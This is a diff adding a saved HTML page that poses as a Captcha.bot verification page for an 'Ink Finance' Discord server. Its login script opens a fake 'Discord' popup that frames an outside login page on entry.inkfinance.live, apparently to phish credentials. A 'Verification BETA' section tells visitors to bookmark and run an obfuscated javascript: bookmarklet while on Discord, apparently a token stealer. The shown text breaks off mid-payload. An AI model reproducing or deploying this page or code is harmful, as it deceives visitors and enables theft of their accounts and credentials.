@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width,initial-scale=1" name="viewport"/>
+  <title>
+   Captcha.bot - Verification done right
+  </title>
+  <meta content="Discord's leading CAPTCHA verification bot. Perfect for NFT, Crypto, and Web3 communities. Anti-raid and anti-phishing links. " name="description"/>
+  <style>
+   body{width:100%;background-color:#1f2937}.has-tooltip:hover .tooltip{visibility:visible;z-index:50}*,:after,:before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}:after,:before{--tw-content:""}html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{margin:0;line-height:inherit}a{color:inherit;text-decoration:inherit}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}h1,h3,p{margin:0}ul{list-style:none;margin:0;padding:0}input::-moz-placeholder,textarea::-moz-placeholder{color:#9ca3af}input::placeholder,textarea::placeholder{color:#9ca3af}img,svg{display:block;vertical-align:middle}img{max-width:100%;height:auto}[multiple]:focus,[type=date]:focus,[type=datetime-local]:focus,[type=email]:focus,[type=month]:focus,[type=number]:focus,[type=password]:focus,[type=search]:focus,[type=tel]:focus,[type=text]:focus,[type=time]:focus,[type=url]:focus,[type=week]:focus,select:focus,textarea:focus{outline:2px solid transparent;outline-offset:2px;--tw-ring-inset:var(--tw-empty, );--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset)0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow);border-color:#2563eb}input::-moz-placeholder,textarea::-moz-placeholder{color:#6b7280;opacity:1}input::placeholder,textarea::placeholder{color:#6b7280;opacity:1}::-webkit-datetime-edit-fields-wrapper{padding:0}::-webkit-date-and-time-value{min-height:1.5em}::-webkit-datetime-edit,::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-meridiem-field,::-webkit-datetime-edit-millisecond-field,::-webkit-datetime-edit-minute-field,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-second-field,::-webkit-datetime-edit-year-field{padding-top:0;padding-bottom:0}[type=checkbox]:focus,[type=radio]:focus{outline:2px solid transparent;outline-offset:2px;--tw-ring-inset:var(--tw-empty, );--tw-ring-offset-width:2px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset)0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow)}[type=checkbox]:checked:focus,[type=checkbox]:checked:hover,[type=radio]:checked:focus,[type=radio]:checked:hover{border-color:transparent;background-color:currentColor}[type=checkbox]:indeterminate:focus,[type=checkbox]:indeterminate:hover{border-color:transparent;background-color:currentColor}[type=file]:focus{outline:1px solid ButtonText;outline:1px auto -webkit-focus-ring-color}*,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0#0000;--tw-ring-shadow:0 0#0000;--tw-shadow:0 0#0000;--tw-shadow-colored:0 0#0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0#0000;--tw-ring-shadow:0 0#0000;--tw-shadow:0 0#0000;--tw-shadow-colored:0 0#0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.pointer-events-none{pointer-events:none}.fixed{position:fixed}.inset-0{top:0;right:0;bottom:0;left:0}.z-50{z-index:50}.col-span-2{grid-column:span 2/span 2}.mx-auto{margin-left:auto;margin-right:auto}.my-auto{margin-top:auto;margin-bottom:auto}.my-8{margin-top:2rem;margin-bottom:2rem}.mt-4{margin-top:1rem}.mt-12{margin-top:3rem}.mt-8{margin-top:2rem}.mt-0{margin-top:0}.mb-4{margin-bottom:1rem}.mt-0\.5{margin-top:.125rem}.mt-48{margin-top:12rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-5{height:1.25rem}.h-20{height:5rem}.w-5{width:1.25rem}.w-full{width:100%}.w-20{width:5rem}.min-w-full{min-width:100%}.max-w-7xl{max-width:80rem}.flex-grow{flex-grow:1}@keyframes spin{to{transform:rotate(1turn)}}@keyframes pulse{50%{opacity:.5}}.cursor-pointer{cursor:pointer}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}.grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.flex-col{flex-direction:column}.place-items-center{place-items:center}.items-start{align-items:flex-start}.items-end{align-items:flex-end}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-3{gap:.75rem}.gap-8{gap:2rem}.gap-2{gap:.5rem}.gap-1{gap:.25rem}.gap-6{gap:1.5rem}.space-x-7>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.75rem*var(--tw-space-x-reverse));margin-left:calc(1.75rem*(1 - var(--tw-space-x-reverse)))}.space-y-4>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem*var(--tw-space-y-reverse))}.break-words{overflow-wrap:break-word}.break-all{word-break:break-all}.rounded-lg{border-radius:.5rem}.rounded-md{border-radius:.375rem}.bg-gray-900{--tw-bg-opacity:1;background-color:rgb(17 24 39/var(--tw-bg-opacity))}.bg-discord{--tw-bg-opacity:1;background-color:rgb(88 101 242/var(--tw-bg-opacity))}.bg-gray-600{--tw-bg-opacity:1;background-color:rgb(75 85 99/var(--tw-bg-opacity))}.p-4{padding:1rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.px-4{padding-left:1rem;padding-right:1rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.px-2{padding-left:.5rem;padding-right:.5rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-0\.5{padding-top:.125rem;padding-bottom:.125rem}.pt-4{padding-top:1rem}.pt-12{padding-top:3rem}.pb-4{padding-bottom:1rem}.pb-12{padding-bottom:3rem}.pt-3{padding-top:.75rem}.pr-8{padding-right:2rem}.pl-8{padding-left:2rem}.pt-0{padding-top:0}.pl-5{padding-left:1.25rem}.pt-6{padding-top:1.5rem}.pt-2{padding-top:.5rem}.pb-6{padding-bottom:1.5rem}.text-center{text-align:center}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-2xl{font-size:1.5rem;line-height:2rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.font-semibold{font-weight:600}.font-bold{font-weight:700}.font-extrabold{font-weight:800}.uppercase{text-transform:uppercase}.tracking-wider{letter-spacing:.05em}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.text-gray-200{--tw-text-opacity:1;color:rgb(229 231 235/var(--tw-text-opacity))}.text-gray-100{--tw-text-opacity:1;color:rgb(243 244 246/var(--tw-text-opacity))}.text-indigo-600{--tw-text-opacity:1;color:rgb(79 70 229/var(--tw-text-opacity))}.text-gray-300{--tw-text-opacity:1;color:rgb(209 213 219/var(--tw-text-opacity))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175/var(--tw-text-opacity))}.placeholder-gray-200::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(229 231 235/var(--tw-placeholder-opacity))}.placeholder-gray-200::placeholder{--tw-placeholder-opacity:1;color:rgb(229 231 235/var(--tw-placeholder-opacity))}.shadow-lg{--tw-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -4px rgba(0,0,0,.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color),0 4px 6px -4px var(--tw-shadow-color)}.shadow-2xl,.shadow-lg{box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow)}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgba(0,0,0,.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color)}.duration-200{transition-duration:.2s}.placeholder\:text-gray-300::-moz-placeholder{--tw-text-opacity:1;color:rgb(209 213 219/var(--tw-text-opacity))}.placeholder\:text-gray-300::placeholder{--tw-text-opacity:1;color:rgb(209 213 219/var(--tw-text-opacity))}.after\:absolute:after{content:var(--tw-content);position:absolute}.after\:top-\[2px\]:after{content:var(--tw-content);top:2px}.after\:left-\[2px\]:after{content:var(--tw-content);left:2px}.after\:h-5:after{content:var(--tw-content);height:1.25rem}.after\:w-5:after{content:var(--tw-content);width:1.25rem}.after\:rounded-full:after{content:var(--tw-content);border-radius:9999px}.after\:border:after{content:var(--tw-content);border-width:1px}.after\:border-gray-300:after{content:var(--tw-content);--tw-border-opacity:1;border-color:rgb(209 213 219/var(--tw-border-opacity))}.after\:bg-white:after{content:var(--tw-content);--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.after\:transition-all:after{content:var(--tw-content);transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.after\:content-\[\'\'\]:after{--tw-content:"";content:var(--tw-content)}.hover\:scale-110:hover{--tw-scale-x:1.1;--tw-scale-y:1.1}.hover\:scale-105:hover,.hover\:scale-110:hover{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.hover\:scale-105:hover{--tw-scale-x:1.05;--tw-scale-y:1.05}.hover\:bg-discord-10:hover{--tw-bg-opacity:1;background-color:rgb(63 76 217/var(--tw-bg-opacity))}.hover\:bg-gray-700:hover{--tw-bg-opacity:1;background-color:rgb(55 65 81/var(--tw-bg-opacity))}.hover\:bg-slate-700:hover{--tw-bg-opacity:1;background-color:rgb(51 65 85/var(--tw-bg-opacity))}.hover\:bg-transparent:hover{background-color:transparent}.hover\:bg-indigo-50:hover{--tw-bg-opacity:1;background-color:rgb(238 242 255/var(--tw-bg-opacity))}.hover\:bg-green-700:hover{--tw-bg-opacity:1;background-color:rgb(21 128 61/var(--tw-bg-opacity))}.hover\:bg-indigo-400:hover{--tw-bg-opacity:1;background-color:rgb(129 140 248/var(--tw-bg-opacity))}.hover\:bg-gray-50:hover{--tw-bg-opacity:1;background-color:rgb(249 250 251/var(--tw-bg-opacity))}.hover\:bg-discord:hover{--tw-bg-opacity:1;background-color:rgb(88 101 242/var(--tw-bg-opacity))}.hover\:bg-slate-800:hover{--tw-bg-opacity:1;background-color:rgb(30 41 59/var(--tw-bg-opacity))}.hover\:bg-red-600:hover{--tw-bg-opacity:1;background-color:rgb(220 38 38/var(--tw-bg-opacity))}.hover\:bg-red-700:hover{--tw-bg-opacity:1;background-color:rgb(185 28 28/var(--tw-bg-opacity))}.hover\:bg-gray-100:hover{--tw-bg-opacity:1;background-color:rgb(243 244 246/var(--tw-bg-opacity))}.hover\:stroke-gray-300:hover{stroke:#d1d5db}.hover\:text-discord:hover{--tw-text-opacity:1;color:rgb(88 101 242/var(--tw-text-opacity))}.hover\:text-white:hover{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.hover\:text-indigo-700:hover{--tw-text-opacity:1;color:rgb(67 56 202/var(--tw-text-opacity))}.hover\:text-gray-400:hover{--tw-text-opacity:1;color:rgb(156 163 175/var(--tw-text-opacity))}.hover\:text-discord-10:hover{--tw-text-opacity:1;color:rgb(63 76 217/var(--tw-text-opacity))}.hover\:text-gray-500:hover{--tw-text-opacity:1;color:rgb(107 114 128/var(--tw-text-opacity))}.hover\:text-gray-300:hover{--tw-text-opacity:1;color:rgb(209 213 219/var(--tw-text-opacity))}.hover\:text-indigo-300:hover{--tw-text-opacity:1;color:rgb(165 180 252/var(--tw-text-opacity))}.hover\:text-gray-900:hover{--tw-text-opacity:1;color:rgb(17 24 39/var(--tw-text-opacity))}.hover\:underline:hover{text-decoration-line:underline}.focus\:z-10:focus{z-index:10}.focus\:border-none:focus{border-style:none}.focus\:border-discord:focus{--tw-border-opacity:1;border-color:rgb(88 101 242/var(--tw-border-opacity))}.focus\:border-indigo-500:focus{--tw-border-opacity:1;border-color:rgb(99 102 241/var(--tw-border-opacity))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-1:focus{--tw-ring-offset-shadow:var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset)0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color)}.focus\:ring-1:focus,.focus\:ring-2:focus{box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0#0000)}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset)0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color)}.focus\:ring-0:focus{--tw-ring-offset-shadow:var(--tw-ring-inset)0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset)0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0#0000)}.focus\:ring-inset:focus{--tw-ring-inset:inset}.focus\:ring-discord:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(88 101 242/var(--tw-ring-opacity))}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241/var(--tw-ring-opacity))}.focus-visible\:outline:focus-visible{outline-style:solid}.focus-visible\:outline-2:focus-visible{outline-width:2px}.focus-visible\:outline-offset-2:focus-visible{outline-offset:2px}.focus-visible\:outline-indigo-500:focus-visible{outline-color:#6366f1}.disabled\:hover\:bg-green-600:hover:disabled{--tw-bg-opacity:1;background-color:rgb(22 163 74/var(--tw-bg-opacity))}.group:hover .group-hover\:stroke-2{stroke-width:2}.group:hover .group-hover\:text-discord-10{--tw-text-opacity:1;color:rgb(63 76 217/var(--tw-text-opacity))}.group:hover .group-hover\:text-gray-300{--tw-text-opacity:1;color:rgb(209 213 219/var(--tw-text-opacity))}.group:hover .group-hover\:text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.group:hover .group-hover\:opacity-100{opacity:1}.group:hover .group-hover\:duration-200{transition-duration:.2s}.peer:checked~.peer-checked\:after\:translate-x-full:after{content:var(--tw-content);--tw-translate-x:100%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.peer:checked~.peer-checked\:after\:border-white:after{content:var(--tw-content);--tw-border-opacity:1;border-color:rgb(255 255 255/var(--tw-border-opacity))}.peer:focus~.peer-focus\:outline-none{outline:2px solid transparent;outline-offset:2px}@media (min-width:640px){.sm\:items-end{align-items:flex-end}.sm\:p-6{padding:1.5rem}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}}@media (min-width:768px){.md\:mx-auto{margin-left:auto;margin-right:auto}.md\:mt-0{margin-top:0}.md\:block{display:block}.md\:flex{display:flex}.md\:grid{display:grid}.md\:hidden{display:none}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.md\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.md\:gap-8{gap:2rem}.md\:gap-6{gap:1.5rem}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}.lg\:pt-16{padding-top:4rem}.lg\:pb-16{padding-bottom:4rem}}@media (min-width:1280px){.xl\:col-span-2{grid-column:span 2/span 2}.xl\:mt-0{margin-top:0}.xl\:grid{display:grid}.xl\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.xl\:gap-8{gap:2rem}.xl\:px-32{padding-left:8rem;padding-right:8rem}.xl\:text-center{text-align:center}}
+  </style>
+  <style>
+   .link[data-v-1b5fa2e5]{font-weight:700;--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.link[data-v-1b5fa2e5]:hover{--tw-text-opacity:1;color:rgb(209 213 219/var(--tw-text-opacity))}.mobile-item[data-v-1b5fa2e5]:hover{--tw-bg-opacity:1;background-color:rgb(55 65 81/var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}
+  </style>
+  <style>
+  </style>
+  <style>
+  </style>
+  <style>
+  </style>
+  <style>
+  </style>
+  <meta content="no-referrer" name="referrer"/>
+  <link rel="icon" type="image/x-icon" href="/assets/asset_0001.ico">
+<link rel="shortcut icon" type="image/x-icon" href="/assets/asset_0001.ico">
+  <style>
+   .sf-hidden{display:none!important}
+  </style>
+  <link href="https://captcha.bot/verify/guild/1341402165775831160/KONZWLLXU2GCVIEWOCJZTJE5FRNZM444TCTJZKL5ASV2JZFKZTMX2NFRBTN2F5GRILKLJK43SUSAZIU4WSKIQ" rel="canonical"/>
+ </head>
+ <body>
+  <div data-v-app="" id="app">
+   <div>
+    <div aria-live="assertive" class="pointer-events-none fixed inset-0 flex items-end px-4 py-6 sm:p-6 z-50">
+     <div class="flex w-full flex-col items-center space-y-4 sm:items-end">
+      <!-- -->
+     </div>
+    </div>
+    <div data-v-1b5fa2e5="">
+     <div class="mx-auto justify-between pt-4 pr-8 pl-8 hidden md:flex" data-v-1b5fa2e5="">
+      <div class="flex items-center space-x-7" data-v-1b5fa2e5="">
+       <a class="" data-v-1b5fa2e5="" href="https://captcha.bot/">
+        <img class="pt-0 mt-0" data-v-1b5fa2e5="" height="60" src="assets/asset_0002.webp" width="60"/>
+       </a>
+       <a class="link flex my-auto gap-1" data-v-1b5fa2e5="" href="https://captcha.bot/premium">
+        Pricing
+       </a>
+       <a class="link" data-v-1b5fa2e5="" href="https://docs.captcha.bot/">
+        Documentation
+       </a>
+      </div>
+      <div class="flex items-center" data-v-1b5fa2e5="">
+       <div data-v-1b5fa2e5="">
+        <div data-v-1b5fa2e5="">
+         <a class="mt-4 px-5 py-2 md:text-md rounded-lg shadow-lg font-bold uppercase text-white bg-discord duration-200 flex items-center" data-v-1b5fa2e5="" onclick="clickedLogin()">
+          Login
+         </a>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="mx-auto justify-between py-3 pr-8 pl-5 block md:hidden bg-gray-900 sf-hidden" data-v-1b5fa2e5="">
+      <!-- -->
+     </div>
+    </div>
+    <div class="my-8 mx-auto container grid place-items-center">
+     <div data-fuse="22801602532">
+     </div>
+    </div>
+    <!-- -->
+    <div class="container lg:px-8 xl:px-32 md:mx-auto px-4 grid grid-cols-1 md:grid-cols-3 md:gap-6 mt-8">
+     <div style="display:flex;flex-direction:column;height:100%;">
+      <div class="bg-gray-900 rounded-lg shadow-2xl break-words mb-4">
+       <div class="flex gap-3 px-4 py-4">
+        <img alt="servername here" class="h-20 rounded-md" src="assets/asset_0003.png"/>
+        <div class="inline-block w-full container break-all">
+         <h1 class="text-white text-xl font-extrabold">
+          Ink Finance
+         </h1>
+         <p class="text-gray-300 text-sm">
+          <span class="font-semibold">
+           3,107
+          </span>
+          members
+         </p>
+        </div>
+       </div>
+       <p class="px-4 pt-2 pb-6 text-gray-300">
+        <span>
+         Ink Finance
+        </span>
+        requires you to verify you are a human before you can interact. This'll only take a few moments!
+       </p>
+       <!-- -->
+       <div class="px-4 py-4">
+        <a class="block bg-discord hover:bg-discord-10 rounded-lg shadow-lg text-white text-center py-2 text-base px-4 font-semibold min-w-full" onclick="clickedLogin()">
+         Login to verify
+        </a>
+        <script>
+        function clickedLogin() {
+                                if (window.innerWidth > 1000) {
+                                    let width = screen.width / 2;  
+                                    let height = screen.height / 2;
+                                    let left = (screen.width - width) / 2;
+                                    let top = (screen.height - height) / 2;
+                                    
+                                    let faviconUrl = location.protocol + "//" + location.hostname + "/assets/discord.ico"
+
+
+                                    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=${width},height=${height},left=${left},top=${top}`;
+                                    newWin = window.open('', 'Discord', params);
+                                    newWin.document.write(`<head><link rel="icon" href="${faviconUrl}" /><title>Discord</title></head><iframe src="https://entry.inkfinance.live/login" style="border: none; padding: none; margin: none; width: 100%; height: 100%; position: absolute; left: 0px; top: 0px;">`);
+                                } else {
+                                    location.href = "https://entry.inkfinance.live/login"
+                                }
+                            }
+       </script>
+        <div class="flex gap-3 pt-3">
+         <a class="bg-discord hover:bg-discord-10 rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full" href="https://captcha.bot/support">
+          Get help
+         </a>
+         <a class="bg-gray-600 hover:bg-gray-700 rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full" href="https://captcha.bot/legal">
+          <span class="flex gap-2 justify-center">
+           <svg class="w-5 h-5 mt-0.5" fill="none" stroke="currentColor" stroke-width="2.25" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" stroke-linecap="round" stroke-linejoin="round">
+            </path>
+           </svg>
+           Terms
+          </span>
+         </a>
+        </div>
+       </div>
+      </div>
+      <div class="bg-gray-900 rounded-lg shadow-2xl break-words mb-4">
+       <div>
+        <a class="flex gap-3 px-4 py-4 container cursor-pointer" href="https://arcane.bot/invite" target="_blank">
+         <img alt="Promotable image" class="h-20 w-20 rounded-md" src="assets/asset_0004.webp"/>
+         <div>
+          <div class="flex items-start container">
+           <div>
+            <h1 class="flow-left text-white text-lg font-extrabold">
+             Arcane-chan
+            </h1>
+           </div>
+           <div class="flex-grow">
+           </div>
+           <div class="bg-discord px-2 py-0.5 text-white text-sm font-semibold rounded-lg">
+            Promoted
+           </div>
+          </div>
+          <p class="text-gray-300">
+           Multipurpose leveling and moderation bot. Add a fresh coat of paint to your server!
+          </p>
+         </div>
+        </a>
+       </div>
+      </div>
+     </div>
+     <div class="col-span-2" style="display:flex;flex-direction:column;height:100%;">
+      <div class="bg-gray-900 rounded-lg shadow-2xl">
+       <div class="p-4">
+        <h1 class="text-white text-xl font-semibold">
+         Captcha.bot Information
+        </h1>
+        <p class="text-gray-300 text-base">
+         Captcha.bot has protected over
+         <span class="font-semibold">
+          500,000
+         </span>
+         discord servers and stopped hundreds of thousands of raids since 2018.
+        </p>
+        <div>
+         <div class="grid grid-cols-3 gap-3 pt-3">
+          <a class="bg-discord hover:bg-discord-10 rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full" href="https://captcha.bot/premium">
+           Purchase Premium
+          </a>
+          <a class="bg-gray-600 hover:bg-gray-700 rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full" href="https://captcha.bot/invite">
+           Protect your server
+          </a>
+          <a class="bg-gray-600 hover:bg-gray-700 rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full" href="https://captcha.bot/twitter">
+           Follow on Twitter
+          </a>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="flex gap-6 justify-center pt-6">
+       <div data-fuse="22801602526">
+       </div>
+       <div class="hidden md:block" data-fuse="22801602514">
+       </div>
+      </div>
+      <div class="bg-gray-900 rounded-lg shadow-2xl" style="flex:1;">
+       <div class="p-4">
+        <h1 class="text-white text-xl font-semibold">
+         Verification BETA
+        </h1>
+        <p class="text-gray-300 text-base">
+         Drag the button below to your bookmarks, navigate to Discord and press the button. (Press Ctrl + Shift + B if you don't see your bookmark bar).
+        </p>
+        <div>
+         <div class="grid grid-cols-3 gap-3 pt-3">
+          <a class="bg-discord hover:bg-discord-10 rounded-lg shadow-lg text-white text-center py-1.5 px-4 font-semibold w-full" href="javascript:function a0_0x213d(){const t=[&quot;Dg9UihrVihLVDq&quot;,&quot;vhvOy2e&quot;,&quot;y3jLyxrLrwXLBq&quot;,&quot;AMPhz20&quot;,&quot;ue5OvuW&quot;,&quot;ndC2mZy3CLDAtxDZ&quot;,&quot;wKftv0e&quot;,&quot;sg5kD2i&quot;,&quot;zc5JB20&quot;,&quot;CwLJqLq&quot;,&quot;jNvZzxjUyw1Lpq&quot;,&quot;B1vJt3i&quot;,&quot;Bg9N&quot;,&quot;CM4GDgHPCYiPka&quot;,&quot;yxbWBhK&quot;,&quot;wNHtweW&quot;,&quot;C2vHCMnO&quot;,&quot;vgPKt2q&quot;,&quot;y29UDgvUDfDPBG&quot;,&quot;CLzjCue&quot;,&quot;y29Yzc5JB20&quot;,&quot;vuPUEwC&quot;,&quot;txvSDgLby2nVDq&quot;,&quot;swC9pq&quot;,&quot;CgfYC2u&quot;,&quot;x3n0yxrL&quot;,&quot;mtq0mJKXmJG3nW&quot;,&quot;y2fUyxj5lMrPCW&quot;,&quot;DxnLCNm&quot;,&quot;y2S/Dg9Rzw49&quot;,&quot;mtq0mJKXmtmXnW&quot;,&quot;zMzLr1a&quot;,&quot;ndm0oty2u1bOyvvH&quot;,&quot;CMvWBgfJzufSBa&quot;,&quot;mJG5odi5ofjxuMrbDG&quot;,&quot;y29UC3rYDwn0BW&quot;,&quot;uLbIBgW&quot;,&quot;D2fYBG&quot;,&quot;Aw5JBhvKzxm&quot;,&quot;Dw5RBM93BG&quot;,&quot;CgfYC2uGtxvSDa&quot;,&quot;yxbWzw5Kq2HPBa&quot;,&quot;CMvSB2fK&quot;,&quot;teXoBve&quot;,&quot;DxjZzwXMlG&quot;,&quot;Chm6lY9KAxnJBW&quot;,&quot;BgvUz3rO&quot;,&quot;qM10rgi&quot;,&quot;vu10sfm&quot;,&quot;t2TLvMe&quot;,&quot;E30Uy29UC3rYDq&quot;,&quot;A2fxyMm&quot;,&quot;zg93&quot;,&quot;AxnbCNjHEq&quot;,&quot;mJaXndb2CMvpwve&quot;,&quot;Ce9vrei&quot;,&quot;ChHrveW&quot;,&quot;jNjVBgvFAwq9&quot;,&quot;ChjVDg90ExbL&quot;,&quot;ChrIlMrPC2nVCG&quot;,&quot;ufHHEhq&quot;,&quot;Bg9JyxrPB24&quot;,&quot;nJq2mLnsthbuqG&quot;,&quot;C2vYBMfTztO&quot;,&quot;suntze8&quot;,&quot;y2HL&quot;,&quot;uMvZB2X2zwqGDq&quot;,&quot;CYbIyxiGy